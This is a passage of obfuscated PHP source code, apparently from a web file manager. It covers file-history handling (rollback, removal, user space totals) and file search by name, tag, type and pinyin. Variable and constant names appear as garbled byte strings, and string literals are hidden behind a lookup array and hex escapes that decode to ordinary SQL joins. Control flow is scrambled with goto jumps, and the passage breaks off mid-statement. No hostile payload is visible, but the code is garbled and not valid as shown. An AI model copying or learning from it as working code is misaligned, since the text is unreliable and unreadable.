$F–Ğ‚ìˆÙ‘[33], $F–Ğ‚ìˆÙ‘[1504]); $fä¥¥Î¸°Ö = Model($F–Ğ‚ìˆÙ‘[501])->userListInfo($F‹ßê¨ùÙá); foreach ($CÄå½¯İ™ as &$A‘ÇæğßŒ”) { $aêˆÜĞåˆ¼ = $A‘ÇæğßŒ”[$F–Ğ‚ìˆÙ‘[1504]]; $A‘ÇæğßŒ”[$F–Ğ‚ìˆÙ‘[426]] = $fä¥¥Î¸°Ö[$aêˆÜĞåˆ¼] ? $fä¥¥Î¸°Ö[$aêˆÜĞåˆ¼] : !1; } unset($A‘ÇæğßŒ”); } public function fileInfo($D‘ãŒâà™³) { $e†¯Ş‘³Ğ =& $_SERVER[¹…ÕÄ]; $a—ã‡æõë = $this->tablePrefix; $dˆ»ùíƒŞÃ = "{$a—ã‡æõë}\x69\x6f\x5f\x66\x69\154\x65\x20\x66\151\x6c\145\x73\x20\157\156\x20\x66\151\x6c\x65\163\56\146\151\x6c\x65\x49\x44\x20\75\x20\x68\x69\163\x74\x6f\x72\171\x2e\146\151\154\x65\x49\104"; return $this->alias($e†¯Ş‘³Ğ[1905])->where(array($e†¯Ş‘³Ğ[406] => $D‘ãŒâà™³))->join($dˆ»ùíƒŞÃ, $e†¯Ş‘³Ğ[1906])->find(); } public function removeItem($d‹·¸‰Ò‚) { $B¿¨á£Â¶ä =& $_SERVER[¹…ÕÄ]; $Bñ†ç£ø¸¸ = array($B¿¨á£Â¶ä[406] => $d‹·¸‰Ò‚); $EÒ’ëæ¥À“ = $this->where($Bñ†ç£ø¸¸)->find(); if ($EÒ’ëæ¥À“) { $b«ÁÄëÀ«È = $this->where($Bñ†ç£ø¸¸)->delete(); Model($B¿¨á£Â¶ä[444])->remove($EÒ’ëæ¥À“[$B¿¨á£Â¶ä[441]]); return $b«ÁÄëÀ«È; } return !1; } public function removeBySource($c¤óâ ºÕ) { goto c‘ùÕ²‚°; FÌßÓ·°: $Dôã„ï¿»ê = array($cÒ˜ùé³ä[404] => array($cÒ˜ùé³ä[7], $c¤óâ ºÕ)); $bÖ„öİÃè = $this->field($cÒ˜ùé³ä[442])->where($Dôã„ï¿»ê)->select(); if ($bÖ„öİÃè) { $this->where($Dôã„ï¿»ê)->delete(); $eâ•ñ‘‰¥Œ = array_to_keyvalue($bÖ„öİÃè, $cÒ˜ùé³ä[33], $cÒ˜ùé³ä[441]); Model($cÒ˜ùé³ä[444])->remove($eâ•ñ‘‰¥Œ); } goto EõÉÆö; EõÉÆö: return !0; goto b»“‘İÇÖ; c‘ùÕ²‚°: $cÒ˜ùé³ä =& $_SERVER[¹…ÕÄ]; if (!$c¤óâ ºÕ) { return !1; } if (!is_array($c¤óâ ºÕ)) { $c¤óâ ºÕ = array($c¤óâ ºÕ); } goto FÌßÓ·°; b»“‘İÇÖ: } public function setDetail($aÌÆ½õÖ¸, $fõßš£‰ô) { $F–ÊŒ¨†ĞÇ =& $_SERVER[¹…ÕÄ]; return $this->where(array($F–ÊŒ¨†ĞÇ[406] => $aÌÆ½õÖ¸))->save(array($F–ÊŒ¨†ĞÇ[1896] => $fõßš£‰ô)); } public function rollbackToItem($D´ñ¥†®Ó, $CïĞÚ”İïÎ) { goto Fï÷œŞ‹æ; a¡—“…ÛÂ: return $this->where(array($Fñ²Úğ¨¿[406] => $CïĞÚ”İïÎ))->delete(); goto aÔ–¥Ê¹Ó; Fï÷œŞ‹æ: $Fñ²Úğ¨¿ =& $_SERVER[¹…ÕÄ]; $cË™¦„öˆ± = Model($Fñ²Úğ¨¿[770])->sourceInfo($D´ñ¥†®Ó); $this->addHistory($cË™¦„öˆ±, LNG($Fñ²Úğ¨¿[1907])); goto BòÖç¾õ¥¤; BòÖç¾õ¥¤: $AëÕÍ¿‘Óê = $this->find($CïĞÚ”İïÎ); $eÄÄò÷“Ç¼ = array($Fñ²Úğ¨¿[441] => $AëÕÍ¿‘Óê[$Fñ²Úğ¨¿[441]], $Fñ²Úğ¨¿[77] => $AëÕÍ¿‘Óê[$Fñ²Úğ¨¿[77]], $Fñ²Úğ¨¿[83] => time(), $Fñ²Úğ¨¿[428] => USER_ID); Model($Fñ²Úğ¨¿[770])->where(array($Fñ²Úğ¨¿[390] => $D´ñ¥†®Ó))->save($eÄÄò÷“Ç¼); goto a¡—“…ÛÂ; aÔ–¥Ê¹Ó: } public function clearSame($CƒÃå«¸£¡) { goto fŠËÊÌÚˆ; fŠËÊÌÚˆ: $b¸×ãÇ¨ =& $_SERVER[¹…ÕÄ]; $añÃ§ƒ’øÉ = $this->listData($CƒÃå«¸£¡); $C‰›Õ†îö = array_to_keyvalue_group($añÃ§ƒ’øÉ, $b¸×ãÇ¨[441]); goto e§™¶ßàâ™; A¤âÕìÉ: if (!$d£ÂÎ”Í§) { return; } $this->where(array($b¸×ãÇ¨[388] => array($b¸×ãÇ¨[7], $d£ÂÎ”Í§)))->delete(); Model($b¸×ãÇ¨[444])->remove($e‡»×¸ ÁÓ); goto eÆĞÏÊ; e§™¶ßàâ™: $e‡»×¸ ÁÓ = array(); $d£ÂÎ”Í§ = array(); foreach ($C‰›Õ†îö as $a‡ƒ«ãæã¸) { if (!$a‡ƒ«ãæã¸ || count($a‡ƒ«ãæã¸) <= 1) { continue; } foreach ($a‡ƒ«ãæã¸ as $Bğé®Õ¡—Ó) { $e‡»×¸ ÁÓ[] = $Bğé®Õ¡—Ó[$b¸×ãÇ¨[441]]; $d£ÂÎ”Í§[] = $Bğé®Õ¡—Ó[$b¸×ãÇ¨[388]]; } } goto A¤âÕìÉ; eÆĞÏÊ: } public function userSpace() { $b×Ö«Â£É =& $_SERVER[¹…ÕÄ]; $cã„¹ŞŞ³‹ = $this->tablePrefix; $F¥›Ú‹¿¡ = array($b×Ö«Â£É[1496] => USER_ID); $Eö¶ò¢ÚÅé = "{$cã„¹ŞŞ³‹}\151\x6f\x5f\146\151\154\x65\x20\146\x69\154\x65\x73\x20\157\x6e\40\146\x69\154\x65\163\x2e\146\151\x6c\x65\111\x44\40\x3d\x20\x68\151\x73\164\157\162\171\x2e\146\151\154\x65\111\104"; return $this->alias($b×Ö«Â£É[1905])->where($F¥›Ú‹¿¡)->join($Eö¶ò¢ÚÅé, $b×Ö«Â£É[1906])->sum($b×Ö«Â£É[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($dÎÁÅÍåì‹) { goto dŠ½™ÛÈæ·; E‡­‹ÖÍšù: if (!$e£’¡›¨Ï¿[$CË¾‹”Å½ã[167]]) { $cßŠ··Êèº = array_to_keyvalue($a“ˆ¡ÙÙ, $CË¾‹”Å½ã[33], $CË¾‹”Å½ã[167]); $Eâï³ã­òä = implode($CË¾‹”Å½ã[47], $cßŠ··Êèº); $DŠ”Â³öÄ¨ = $CË¾‹”Å½ã[1908]; } $FğŞ½»æÁí = explode($CË¾‹”Å½ã[47], trim($Eâï³ã­òä, $CË¾‹”Å½ã[47])); return array($DŠ”Â³öÄ¨, $FğŞ½»æÁí); goto c¯Â­è¡òš; B‡¼ôØ„­: if (!$e£’¡›¨Ï¿) { return array(); } $Eâï³ã­òä = $e£’¡›¨Ï¿[$CË¾‹”Å½ã[167]]; $DŠ”Â³öÄ¨ = $CË¾‹”Å½ã[7]; goto E‡­‹ÖÍšù; dŠ½™ÛÈæ·: $CË¾‹”Å½ã =& $_SERVER[¹…ÕÄ]; $a“ˆ¡ÙÙ = KodIO::fileTypeList(); $e£’¡›¨Ï¿ = $a“ˆ¡ÙÙ[$dÎÁÅÍåì‹]; goto B‡¼ôØ„­; c¯Â­è¡òš: } public function listPathType($AÍ‘øÊØÄ­) { $aµ›ÍÊ³ =& $_SERVER[¹…ÕÄ]; $EÚ¸ƒÛôùŠ = $this->fileTypeWhere($AÍ‘øÊØÄ­); if (!$EÚ¸ƒÛôùŠ) { return array(); } $bšô•­ö = array($aµ›ÍÊ³[544] => SourceModel::TYPE_USER, $aµ›ÍÊ³[545] => USER_ID, $aµ›ÍÊ³[541] => 0, $aµ›ÍÊ³[542] => $EÚ¸ƒÛôùŠ); return $this->listSource($bšô•­ö); } public function listSearch($a©Ôòò®…¢, $Cë»…í·ë = 300) { goto dÈâÃÃ¨·µ; D¾¡ˆï‘‡: return $C ·Â£‹›˜; goto AËö½Íç; cöÛš›šÍ: $C ·Â£‹›˜ = $this->distinct(!0)->field($d¤‘âÆ¦ÙÏ)->where($a×ˆ°¡ÏÂ)->selectPage($Cë»…í·ë); $this->_listSearchDesc($C ·Â£‹›˜, $a©Ôòò®…¢, $E‹‹ï’óº); $this->_listSearchTag($C ·Â£‹›˜, $a©Ôòò®…¢, $E‹‹ï’óº); goto dÏ’¶É‡²Ô; EÆí›ò®˜: if (!isset($a×ˆ°¡ÏÂ[$AÏÊ®ç¢[417]])) { $a×ˆ°¡ÏÂ[$AÏÊ®ç¢[417]] = 0; } $d¤‘âÆ¦ÙÏ = $AÏÊ®ç¢[1910]; $E‹‹ï’óº = $d¤‘âÆ¦ÙÏ; goto F†ô¼¼»; F†ô¼¼»: $this->_listSearchBindPinyin($a©Ôòò®…¢, $a×ˆ°¡ÏÂ, $d¤‘âÆ¦ÙÏ); $this->alias($AÏÊ®ç¢[511])->_makeOrder(); $a×ˆ°¡ÏÂ = $this->parseWhereLike($a×ˆ°¡ÏÂ); goto cöÛš›šÍ; dÏ’¶É‡²Ô: $this->_listSearchGroupTag($C ·Â£‹›˜, $a©Ôòò®…¢, $E‹‹ï’óº); $this->_listDataApply($C ·Â£‹›˜[$AÏÊ®ç¢[365]]); $this->_listMake($C ·Â£‹›˜); goto D¾¡ˆï‘‡; dÈâÃÃ¨·µ: $AÏÊ®ç¢ =& $_SERVER[¹…ÕÄ]; if (isset($a©Ôòò®…¢[$AÏÊ®ç¢[1751]]) && $a©Ôòò®…¢[$AÏÊ®ç¢[1751]]) { $a©Ôòò®…¢[$AÏÊ®ç¢[1751]] = str_replace($AÏÊ®ç¢[379], $AÏÊ®ç¢[1909], trim($a©Ôòò®…¢[$AÏÊ®ç¢[1751]])); } $a×ˆ°¡ÏÂ = $this->_parseSearchWhere($a©Ôòò®…¢); goto EÆí›ò®˜; AËö½Íç: } private function _listSearchTag(&$EÍ±­öñ³, $Eó¾Ùß«‘, $a‘…âôïóã) { goto dÌÇ¬°çï³; dÈ…‚åÆï¨: if (!$B¨¸Íááõ) { return; } $cñÖé¬‡¦ß = array($A¶£èëÖëğ[413] => array($A¶£èëÖëğ[7], $B¨¸Íááõ), $A¶£èëÖëğ[1504] => USER_ID); $a³×ÓŞ½± = Model($A¶£èëÖëğ[414])->field($A¶£èëÖëğ[75])->where($cñÖé¬‡¦ß)->select(); goto aœ¯»ğÎÏÃ; C™»¹“½íª: $B¨¸Íááõ = array(); $FòÕÄÜŠ‰Ê = $Eó¾Ùß«‘[$A¶£èëÖëğ[1751]]; foreach ($A’Ã¾Ú›ôÜ as $f“¨èçĞ”) { $fèòÎí¦ô½ = $f“¨èçĞ”[$A¶£èëÖëğ[28]]; $AŒ…œÁŠí‚ = str_replace($A¶£èëÖëğ[50], $A¶£èëÖëğ[33], Pinyin::encode($fèòÎí¦ô½)); if (stripos($fèòÎí¦ô½, $FòÕÄÜŠ‰Ê) !== !1 || stripos($AŒ…œÁŠí‚, $FòÕÄÜŠ‰Ê) !== !1) { $B¨¸Íááõ[] = $f“¨èçĞ”[$A¶£èëÖëğ[388]]; } } goto dÈ…‚åÆï¨; aœ¯»ğÎÏÃ: $a³×ÓŞ½± = array_to_keyvalue($a³×ÓŞ½±, $A¶£èëÖëğ[33], $A¶£èëÖëğ[75]); $aæ«„¡Íá = array_unique($a³×ÓŞ½±); $this->_listSearchMerge($EÍ±­öñ³, $Eó¾Ùß«‘, $a‘…âôïóã, $aæ«„¡Íá); goto fÈİ¹™ŸÍ; dÌÇ¬°çï³: $A¶£èëÖëğ =& $_SERVER[¹…ÕÄ]; if (!$Eó¾Ùß«‘[$A¶£èëÖëğ[1751]] || $EÍ±­öñ³[$A¶£èëÖëğ[362]][$A¶£èëÖëğ[349]] > 1) { return; } $A’Ã¾Ú›ôÜ = Model($A¶£èëÖëğ[1911])->listData(); goto C™»¹“½íª; fÈİ¹™ŸÍ: } private function _listSearchDesc(&$AƒˆæØÇî¢, $c¸—à…Äâ÷, $F³õÀ¡—˜¼) { goto a×ô°ƒ×Ø; a×ô°ƒ×Ø: $EÔù™½´Œ– =& $_SERVER[¹…ÕÄ]; if (!$c¸—à…Äâ÷[$EÔù™½´Œ–[1751]] || $AƒˆæØÇî¢[$EÔù™½´Œ–[362]][$EÔù™½´Œ–[349]] > 1) { return; } $fÍá„Ôª‘í = $this->listSearchChildren($c¸—à…Äâ÷[$EÔù™½´Œ–[472]]); goto F˜È­ ±ø; F˜È­ ±ø: $fÍá„Ôª‘í = array_unique($fÍá„Ôª‘í); if (!$fÍá„Ôª‘í) { return; } $d¡°§¼×æ‚ = array($EÔù™½´Œ–[390] => array($EÔù™½´Œ–[7], $fÍá„Ôª‘í), $EÔù™½´Œ–[92] => $EÔù™½´Œ–[425], $EÔù™½´Œ–[370] => array($EÔù™½´Œ–[378], $EÔù™½´Œ–[1753] . $c¸—à…Äâ÷[$EÔù™½´Œ–[1751]] . $EÔù™½´Œ–[1753])); goto CùÖ²™ÈİĞ; CùÖ²™ÈİĞ: $dŠ¸Î¼ãøë = Model($EÔù™½´Œ–[527])->field($EÔù™½´Œ–[390])->where($d¡°§¼×æ‚)->select(); $C·ËßóÌ¿ = array_to_keyvalue($dŠ¸Î¼ãøë, $EÔù™½´Œ–[33], $EÔù™½´Œ–[390]); $this->_listSearchMerge($AƒˆæØÇî¢, $c¸—à…Äâ÷, $F³õÀ¡—˜¼, $C·ËßóÌ¿); goto aæ“Àæ¨; aæ“Àæ¨: } private function _listSearchGroupTag(&$bñïª™ÉÆ, $DöâæˆÆ–©, $fŠØ¡ëî„) { goto FÓİĞŒ¨°ˆ; E¶°—Í­œ: $fÍğáÀ¢ª‹ = array_to_keyvalue($fÍğáÀ¢ª‹, $C¥íä‚÷ğ­[33], $C¥íä‚÷ğ­[75]); $aµ½ÑŞÄ = array_unique($fÍğáÀ¢ª‹); $this->_listSearchMerge($bñïª™ÉÆ, $DöâæˆÆ–©, $fŠØ¡ëî„, $aµ½ÑŞÄ); goto Cåºç¿ƒ¦; DÚ’ÉˆÌÙˆ: $E”ÏªâÛ— = array(); $e…Ïˆô¥±ƒ = $DöâæˆÆ–©[$C¥íä‚÷ğ­[1751]]; foreach ($AĞ ĞÓŒ²‘[$C¥íä‚÷ğ­[365]] as $D ‰óÕ•…) { $BÆ©¼°ÖÑ¬ = $D ‰óÕ•…[$C¥íä‚÷ğ­[28]]; $E‡ÉìĞ†÷î = str_replace($C¥íä‚÷ğ­[50], $C¥íä‚÷ğ­[33], Pinyin::encode($BÆ©¼°ÖÑ¬)); if (stripos($BÆ©¼°ÖÑ¬, $e…Ïˆô¥±ƒ) !== !1 || stripos($E‡ÉìĞ†÷î, $e…Ïˆô¥±ƒ) !== !1) { $E”ÏªâÛ—[] = $D ‰óÕ•…[$C¥íä‚÷ğ­[388]]; } } goto d‹…Ğ²ŞãÓ; d‹…Ğ²ŞãÓ: if (!$E”ÏªâÛ—) { return; } $cº­ŸˆÓó = array($C¥íä‚÷ğ­[413] => array($C¥íä‚÷ğ­[7], $E”ÏªâÛ—), $C¥íä‚÷ğ­[1504] => 0, $C¥íä‚÷ğ­[29] => $C¥íä‚÷ğ­[1775] . $D°¤Œ¥áå); $fÍğáÀ¢ª‹ = Model($C¥íä‚÷ğ­[414])->field($C¥íä‚÷ğ­[75])->where($cº­ŸˆÓó)->select(); goto E¶°—Í­œ; FÓİĞŒ¨°ˆ: $C¥íä‚÷ğ­ =& $_SERVER[¹…ÕÄ]; if (!$DöâæˆÆ–©[$C¥íä‚÷ğ­[1751]] || $bñïª™ÉÆ[$C¥íä‚÷ğ­[362]][$C¥íä‚÷ğ­[349]] > 1 || !$DöâæˆÆ–©[$C¥íä‚÷ğ­[472]]) { return; } $EŒÍÖ™Î¼– = $this->sourceInfo($DöâæˆÆ–©[$C¥íä‚÷ğ­[472]]); goto Cä¥ÊéÊ‰¡; Cä¥ÊéÊ‰¡: if (!$EŒÍÖ™Î¼– || $EŒÍÖ™Î¼–[$C¥íä‚÷ğ­[398]] != SourceModel::TYPE_GROUP) { return; } $D°¤Œ¥áå = $EŒÍÖ™Î¼–[$C¥íä‚÷ğ­[478]]; $AĞ ĞÓŒ²‘ = Model($C¥íä‚÷ğ­[1912])->get($D°¤Œ¥áå); goto DÚ’ÉˆÌÙˆ; Cåºç¿ƒ¦: } private function _listSearchMerge(&$c–™×Ü¹ë, $a¤¦ß¡ô´”, $b–˜ªÇ°”Ú, $f®à‹ŞÇŠ—) { goto f„‘¬œ; D‚—‡‡Î§¥: $c“÷Ñ¡­ÂÛ = $this->field($b–˜ªÇ°”Ú)->where($B‹Ï¯µ»èÉ)->select(); if (!$c“÷Ñ¡­ÂÛ) { return; } $FéÂæ¶‹µÆ = array(); goto b‚”£Í—ƒÍ; bˆğÈàËõ: $e¸°—†ìô = array_diff($f®à‹ŞÇŠ—, $DáÃ¦Şïİ¹); if (!$e¸°—†ìô) { return; } $B‹Ï¯µ»èÉ = array($AÔªÇêŒ„[390] => array($AÔªÇêŒ„[7], $e¸°—†ìô)); goto D‚—‡‡Î§¥; b‚”£Í—ƒÍ: foreach ($c“÷Ñ¡­ÂÛ as $E©Û¦­…¢Õ) { if ($this->_listSearchFilter($E©Û¦­…¢Õ, $a¤¦ß¡ô´”)) { $FéÂæ¶‹µÆ[] = $E©Û¦­…¢Õ; } } $c–™×Ü¹ë[$AÔªÇêŒ„[365]] = array_merge($FéÂæ¶‹µÆ, $c–™×Ü¹ë[$AÔªÇêŒ„[365]]); $c–™×Ü¹ë[$AÔªÇêŒ„[362]][$AÔªÇêŒ„[363]] += count($FéÂæ¶‹µÆ); goto D˜ªÁñƒÂ; f„‘¬œ: $AÔªÇêŒ„ =& $_SERVER[¹…ÕÄ]; if (!$f®à‹ŞÇŠ—) { return; } $DáÃ¦Şïİ¹ = array_to_keyvalue($c–™×Ü¹ë[$AÔªÇêŒ„[365]], $AÔªÇêŒ„[33], $AÔªÇêŒ„[390]); goto bˆğÈàËõ; D˜ªÁñƒÂ: } private function _listSearchFilter($F¢ÁíÔ•íœ, $f¹îÎÚÕâ‹) { goto EÕˆ“¨‘Á¼; EÕˆ“¨‘Á¼: $f›’‘ì­·ò =& $_SERVER[¹…ÕÄ]; $C“‚©‚õ = $F¢ÁíÔ•íœ[$f›’‘ì­·ò[397]] == $f›’‘ì­·ò[86]; if (!strstr($F¢ÁíÔ•íœ[$f›’‘ì­·ò[481]], $f›’‘ì­·ò[47] . $f¹îÎÚÕâ‹[$f›’‘ì­·ò[472]] . $f›’‘ì­·ò[47])) { return !1; } goto DÖÜáÂ·®î; C¶Ó‰Õ´íõ: if (isset($f¹îÎÚÕâ‹[$f›’‘ì­·ò[557]]) && $f¹îÎÚÕâ‹[$f›’‘ì­·ò[557]] != $F¢ÁíÔ•íœ[$f›’‘ì­·ò[428]]) { return !1; } return !0; goto F‚ŸÌâó»ï; DÖÜáÂ·®î: if (isset($f¹îÎÚÕâ‹[$f›’‘ì­·ò[399]]) && $f¹îÎÚÕâ‹[$f›’‘ì­·ò[399]] != $f›’‘ì­·ò[1718]) { if ($f¹îÎÚÕâ‹[$f›’‘ì­·ò[399]] == $f›’‘ì­·ò[76] && !$C“‚©‚õ) { return !1; } if ($f¹îÎÚÕâ‹[$f›’‘ì­·ò[399]] != $f›’‘ì­·ò[76] && $C“‚©‚õ) { return !1; } if (!strstr($F¢ÁíÔ•íœ[$f›’‘ì­·ò[167]], $f›’‘ì­·ò[47] . $f¹îÎÚÕâ‹[$f›’‘ì­·ò[399]] . $f›’‘ì­·ò[47])) { return !1; } } if (isset($f¹îÎÚÕâ‹[$f›’‘ì­·ò[1913]]) && $f¹îÎÚÕâ‹[$f›’‘ì­·ò[1913]] < $F¢ÁíÔ•íœ[$f›’‘ì­·ò[77]]) { return !1; } if (isset($f¹îÎÚÕâ‹[$f›’‘ì­·ò[1914]]) && $f¹îÎÚÕâ‹[$f›’‘ì­·ò[1914]] > $F¢ÁíÔ•íœ[$f›’‘ì­·ò[77]]) { return !1; } goto C¶Ó‰Õ´íõ; F‚ŸÌâó»ï: } public function listSearchChildren($fàÄÄ‰¡£, $A¥Éƒ«Ó‹ = 5000) { goto E—‘‘ˆÏ÷; EÊƒË‹õÓ: $CÏâ›™¬ªÅ = $this->field($aåéäã±çµ[390])->where($C“ŠóĞ¡Æ)->select(); $F¸îğ„µÇÚ = array_to_keyvalue($CÏâ›™¬ªÅ, $aåéäã±çµ[33], $aåéäã±çµ[390]); return $F¸îğ„µÇÚ; goto D“Í¿ø¤ç; E—‘‘ˆÏ÷: $aåéäã±çµ =& $_SERVER[¹…ÕÄ]; $F¸îğ„µÇÚ = array(); $d¥İÌø¥ = $this->sourceInfo($fàÄÄ‰¡£); goto c°â°ì ¸†; c°â°ì ¸†: $C“ŠóĞ¡Æ = array($aåéäã±çµ[481] => array($aåéäã±çµ[378], $d¥İÌø¥[$aåéäã±çµ[481]] . $d¥İÌø¥[$aåéäã±çµ[390]] . $aåéäã±çµ[508])); $Eíİ–œ»éç = $this->field($aåéäã±çµ[390])->cache(null, 600)->where($C“ŠóĞ¡Æ)->count(); if ($Eíİ–œ»éç > $A¥Éƒ«Ó‹) { return $this->_listSearchChildrenNear($fàÄÄ‰¡£, $A¥Éƒ«Ó‹); } goto EÊƒË‹õÓ; D“Í¿ø¤ç: } private function _listSearchChildrenNear($Bìª¸œ„©ï, $E¢ßÇ¸“¤) { goto dÒë­®”Ã¼; A•œ÷®ÀÃ: $cé•â£¢áÎ = $this->field($bìŸ•Š¯Éœ[1915])->where($E¨±è„‚¸ƒ)->select(); $AÖ®Îä«ä = array_to_keyvalue(array_filter_by_field($cé•â£¢áÎ, $bìŸ•Š¯Éœ[397], $bìŸ•Š¯Éœ[86]), $bìŸ•Š¯Éœ[33], $bìŸ•Š¯Éœ[390]); $f½ÒëË·È¢ = array_merge($f½ÒëË·È¢, array_to_keyvalue($cé•â£¢áÎ, $bìŸ•Š¯Éœ[33], $bìŸ•Š¯Éœ[390])); goto BŒ™…ŞÌ·Œ; BŒ™…ŞÌ·Œ: if (!$AÖ®Îä«ä) { return $f½ÒëË·È¢; } $E¨±è„‚¸ƒ = array($bìŸ•Š¯Éœ[472] => array($bìŸ•Š¯Éœ[7], $AÖ®Îä«ä)); $cé•â£¢áÎ = $this->field($bìŸ•Š¯Éœ[1915])->where($E¨±è„‚¸ƒ)->limit($E¢ßÇ¸“¤)->select(); goto D’¹ƒÕŠŠ—; dÒë­®”Ã¼: $bìŸ•Š¯Éœ =& $_SERVER[¹…ÕÄ]; $f½ÒëË·È¢ = array(); $E¨±è„‚¸ƒ = array($bìŸ•Š¯Éœ[472] => $Bìª¸œ„©ï); goto A•œ÷®ÀÃ; D’¹ƒÕŠŠ—: $f½ÒëË·È¢ = array_merge($f½ÒëË·È¢, array_to_keyvalue($cé•â£¢áÎ, $bìŸ•Š¯Éœ[33], $bìŸ•Š¯Éœ[390])); $f½ÒëË·È¢ = array_slice($f½ÒëË·È¢, 0, $E¢ßÇ¸“¤); return $f½ÒëË·È¢; goto d’‹¨Û±×…; d’‹¨Û±×…: } private function _listSearchBindPinyin($dœ¢ÓÆßÖ, &$eË²‚Ğ«¾·, &$CŠ‹‡øõÍ) { goto dÜ±¢½ •Œ; B›Õ±ŠÕªª: $eË²‚Ğ«¾· = $AÈØÚ«™½; goto F¨ÔÊå³Å¢; D·ã¶¡´§¥: $CŠ‹‡øõÍ = $fçò¸³¨ğ±[1917] . str_replace($fçò¸³¨ğ±[47], $fçò¸³¨ğ±[1918], $CŠ‹‡øõÍ); $F‘¦İ®İİĞ = $eË²‚Ğ«¾·[$fçò¸³¨ğ±[28]]; unset($eË²‚Ğ«¾·[$fçò¸³¨ğ±[28]]); goto bà§Óİš¾; dÜ±¢½ •Œ: $fçò¸³¨ğ± =& $_SERVER[¹…ÕÄ]; if (!isset($dœ¢ÓÆßÖ[$fçò¸³¨ğ±[1751]]) || !$dœ¢ÓÆßÖ[$fçò¸³¨ğ±[1751]]) { return; } if (!Input::check($dœ¢ÓÆßÖ[$fçò¸³¨ğ±[1751]], $fçò¸³¨ğ±[314]) || strlen($dœ¢ÓÆßÖ[$fçò¸³¨ğ±[1751]]) < 2) { return; } goto E¾¸„Î¼¹; E¾¸„Î¼¹: $F°¦é÷´É = "\x4c\105\x46\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\x69\157\x5f\163\x6f\x75\x72\143\145\137\155\145\164\141\40\x6d\x65\164\x61\x20\157\x6e\40\163\157\x75\x72\x63\x65\56\x73\157\165\x72\x63\x65\111\x44\40\x3d\x20\155\x65\164\141\x2e\163\x6f\165\162\143\x65\111\x44"; $AÈØÚ«™½ = array(); $CŠ‹‡øõÍ = str_replace(array($fçò¸³¨ğ±[227], $fçò¸³¨ğ±[50], $fçò¸³¨ğ±[1916]), $fçò¸³¨ğ±[33], $CŠ‹‡øõÍ); goto D·ã¶¡´§¥; bà§Óİš¾: foreach ($eË²‚Ğ«¾· as $Bóªç±¨¸ => $bë†„ƒÕ›Ã) { $AÈØÚ«™½[$fçò¸³¨ğ±[1917] . $Bóªç±¨¸] = $bë†„ƒÕ›Ã; } foreach ($F‘¦İ®İİĞ as $Eñ÷™øôºÖ) { $AÈØÚ«™½[] = array($fçò¸³¨ğ±[1919] => $Eñ÷™øôºÖ, $fçò¸³¨ğ±[936] => $fçò¸³¨ğ±[1755], array($fçò¸³¨ğ±[1920] => $Eñ÷™øôºÖ, $fçò¸³¨ğ±[1921] => array($fçò¸³¨ğ±[7], array($fçò¸³¨ğ±[438], $fçò¸³¨ğ±[437])))); } $this->join($F°¦é÷´É); goto B›Õ±ŠÕªª; F¨ÔÊå³Å¢: } private function _parseSearchWhere($fƒ¡ŠÊòÚÎ) { goto c†ŞïÊá…Ô; e–âÛŒœÎ£: if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[557]]) && $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[557]]) { $Fí¦çÑøÁ[] = array($a—÷©¾¨‹[428] => $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[557]], $a—÷©¾¨‹[426] => $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[557]], $a—÷©¾¨‹[936] => $a—÷©¾¨‹[1755]); } if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[399]]) && $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[399]]) { $AÁ¸çÔ¼Ïç = $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[399]]; if ($AÁ¸çÔ¼Ïç == $a—÷©¾¨‹[76]) { $Fí¦çÑøÁ[$a—÷©¾¨‹[397]] = 1; } else { if ($AÁ¸çÔ¼Ïç == $a—÷©¾¨‹[1925]) { $Fí¦çÑøÁ[$a—÷©¾¨‹[397]] = 0; } else { if ($AÁ¸çÔ¼Ïç) { $AÁ¸çÔ¼Ïç = is_array($AÁ¸çÔ¼Ïç) ? $AÁ¸çÔ¼Ïç : explode($a—÷©¾¨‹[47], $AÁ¸çÔ¼Ïç); $Fí¦çÑøÁ[$a—÷©¾¨‹[399]] = array($a—÷©¾¨‹[405], $AÁ¸çÔ¼Ïç); $Fí¦çÑøÁ[$a—÷©¾¨‹[397]] = 0; } } } } if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[472]]) && $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[472]]) { $aÌâ·‘Ø‰Ë = $this->sourceInfo($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[472]]); $Fí¦çÑøÁ[$a—÷©¾¨‹[548]] = array($a—÷©¾¨‹[507], $aÌâ·‘Ø‰Ë[$a—÷©¾¨‹[481]] . $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[472]] . $a—÷©¾¨‹[508]); } goto dÖ»‡øÙÊ; c†ŞïÊá…Ô: $a—÷©¾¨‹ =& $_SERVER[¹…ÕÄ]; $Fí¦çÑøÁ = array(); if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[718]]) && $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[718]]) { $Fí¦çÑøÁ[$a—÷©¾¨‹[83]] = array($a—÷©¾¨‹[1922], $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[718]]); } goto c×ÄäåÂ§å; dÖ»‡øÙÊ: if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1751]]) && trim($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1751]])) { $dÜÔÈèÌ„õ = trim($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1751]]); $f¥â—ìŠÅ = explode($a—÷©¾¨‹[50], $dÜÔÈèÌ„õ); if (strlen($dÜÔÈèÌ„õ) > 2 && (substr($dÜÔÈèÌ„õ, 0, 1) == $a—÷©¾¨‹[115] && substr($dÜÔÈèÌ„õ, -1) == $a—÷©¾¨‹[115]) || substr($dÜÔÈèÌ„õ, 0, 1) == $a—÷©¾¨‹[55] && substr($dÜÔÈèÌ„õ, -1) == $a—÷©¾¨‹[55]) { $dÜÔÈèÌ„õ = substr($dÜÔÈèÌ„õ, 1, -1); $f¥â—ìŠÅ = array($dÜÔÈèÌ„õ); } $Fí¦çÑøÁ[$a—÷©¾¨‹[28]] = array(array($a—÷©¾¨‹[507], $a—÷©¾¨‹[1753] . $dÜÔÈèÌ„õ . $a—÷©¾¨‹[1753])); if 